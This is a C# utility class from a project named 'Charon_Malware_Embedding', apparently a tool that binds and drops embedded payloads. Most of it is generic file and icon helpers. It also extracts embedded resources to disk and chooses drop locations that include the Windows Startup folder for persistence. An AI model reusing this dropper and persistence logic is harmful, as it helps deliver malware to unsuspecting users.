using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Charon_Malware_Embedding.Tools
{
    class Utils
    {
        public static bool IsStringEmpty(string input)
        {
            return string.IsNullOrEmpty(input);
        }
        public static void CopyFilesList(Tools.Fileinformation fileInformation, Tools.BaseName baseNameFile)
        {
            if (!Directory.Exists(Config.TempDIR))
            {
                Directory.CreateDirectory(Config.TempDIR);
            }

            Assembly assembly = Assembly.GetExecutingAssembly();
            string resourceName = $"{assembly.GetName().Name}.Properties.Resources.{fileInformation.ResourceName}";

            try
            {
                byte[] fileBytes = (byte[])Properties.Resources.ResourceManager.GetObject(fileInformation.ResourceName);
                if (fileBytes == null)
                {
                    throw new Exception($"Resource {fileInformation.ResourceName} not found.");
                }

                string filePath = Path.Combine(Config.TempDIR, baseNameFile.ResourceName);
                File.WriteAllBytes(filePath, fileBytes);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Something Is Wrong", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }


        public static string[] AppendToArray(string[] originalArray, string newElement)
        {
            // Create a new array with one additional slot
            string[] newArray = new string[originalArray.Length + 1];

            // Copy existing elements to the new array
            for (int i = 0; i < originalArray.Length; i++)
            {
                newArray[i] = originalArray[i];
            }

            // Add the new element to the end of the new array
            newArray[originalArray.Length] = newElement;

            return newArray;
        }

        public static double BytesToMegabytes(long bytes)
        {
            return bytes / (1024.0 * 1024.0);
        }

        public static string CalculateMD5(string filePath)
        {

            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(filePath))
                {
                    byte[] hash = md5.ComputeHash(stream);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
        }

        public static Icon GetFileIcon(string filePath)
        {
            SHFILEINFO shinfo = new SHFILEINFO();
            IntPtr hImg = SHGetFileInfo(filePath, 0, ref shinfo, (uint)Marshal.SizeOf(shinfo), SHGFI_ICON | SHGFI_LARGEICON);

            if (hImg == IntPtr.Zero)
                return null;

            Icon icon = Icon.FromHandle(shinfo.hIcon);
            return icon;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public IntPtr iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        }

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);

        public const uint SHGFI_ICON = 0x100;
        public const uint SHGFI_LARGEICON = 0x0;    // 'Large icon

        public static string ReadResourceFile(string resourceName)
        {
            try
            {
                // Access the file content from resources
                string content = Properties.Resources.ResourceManager.GetString(resourceName);

                return content;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Somthing Is Wrong", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
        }

        public static void CopyFiles(string srcFileName, string desFileName)
        {
            File.Copy(srcFileName, desFileName, true);
        }
        public static string ReadFile(string filePath)
        {
            string content = File.ReadAllText(filePath);

            return content;

        }
        public static void WriteToFile(string filePath, string content)
        {
            using (StreamWriter writer = new StreamWriter(filePath, false))
            {
                writer.WriteLine(content);
            }
        }

        public static void AppendToFile(string filepath, string content)
        {
            using (StreamWriter writer = new StreamWriter(filepath, true))
            {
                writer.WriteLine(content);
            }
        }


        public static void CreateConfigFile(string Path, string Content)
        {
            if (!File.Exists(Path))
            {
                File.Create(Path);
            }
            else
            {
                Utils.AppendToFile(Path, Content);
            }
        }
        public static void ConfigFilePathExtractFiles(string path)
        {
            if (path == "%TEMP%")
            {

                Config.DroppedFileIn = Config.TempPath;

            }
            else if (path == "%APPDATA%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.AppdataPath);
                Config.DroppedFileIn = Config.AppdataPath;
            }
            else if (path == "%LOCALAPPDATA%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.LocalAppdataPath);
                Config.DroppedFileIn = Config.LocalAppdataPath;
            }
            else if (path == "%USERPROFILE%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.UserProfilePath);
                Config.DroppedFileIn = Config.UserProfilePath;
            }
            else if (path == "%%STARTUP%%")
            {
                //Utils.WriteToFile(Config.templatePathCreation, Config.StartUpPath);
                Config.DroppedFileIn = Config.StartUpPath;
            }
            else
            {
                Config.DroppedFileIn = $"Path={path}";

                //Utils.WriteToFile(Config.templatePathCreation, $"Path={CustomPath.Text}");
            }
        }
    }

}
